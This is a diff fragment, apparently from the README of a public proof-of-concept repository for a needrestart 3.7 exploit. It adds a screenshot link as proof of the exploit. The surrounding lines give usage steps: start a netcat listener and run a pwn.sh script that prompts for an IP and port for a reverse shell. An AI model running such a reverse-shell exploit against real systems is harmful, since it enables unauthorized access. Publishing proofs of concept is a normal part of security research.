@@ -24,3 +24,6 @@ chmod +x pwn.sh
 nc -lvnp port
 ./pwn.sh  #we are prompt for ip and port for shell!!
 ```
+# Prove
+<img width="1199" height="512" alt="image" src="https://github.com/0xmrsecurity/Public_Poc/blob/main/needrestart_3.7/needrestart.png" />
+
